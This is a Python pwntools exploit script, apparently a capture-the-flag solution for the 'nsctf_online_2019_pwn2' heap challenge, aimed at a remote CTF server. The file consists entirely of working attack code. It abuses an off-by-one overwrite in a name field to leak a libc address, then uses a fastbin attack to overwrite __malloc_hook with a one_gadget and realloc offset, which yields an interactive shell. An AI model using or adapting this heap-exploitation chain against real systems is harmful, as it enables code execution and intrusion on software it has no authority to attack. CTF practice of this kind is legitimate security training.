import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./nsctf_online_2019_pwn2')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./nsctf_online_2019_pwn2')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
		else :
			io=remote('node3.buuoj.cn',27823)
			elf=ELF('./nsctf_online_2019_pwn2')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')


		def name(a):
			io.sendlineafter('6.exit\n','4')
			io.sendafter('Please input your name\n',a)

		def add(a):
			io.sendlineafter('6.exit\n','1')
			io.sendlineafter('size\n',str(a))

		def show():
			io.sendlineafter('6.exit\n','3')

		def delete():
			io.sendlineafter('6.exit\n','2')

		def edit(a):
			io.sendlineafter('6.exit\n','5')
			io.sendlineafter('Input the note\n',a)



		io.sendafter('Please input your name\n','a'*1)
		add(0x80)
		add(0x20)
		name('a'*0x30+'\x10')
		delete()
		add(0x90)
		name('a'*0x30+'\x10')
		show()
		libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['__malloc_hook']-88-0x90
		libc.address=libc_base
		add(0x68)
		delete()
		add(0x18)
		name('a'*0x30+'\x10')
		edit(p64(libc.sym['__malloc_hook']-0x23))
		add(0x68)
		add(0x68)
		edit('a'*0xb+p64(libc.address+0xf1147)+p64(libc.sym['realloc']+20))








		success('libc_base:'+hex(libc_base))

		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue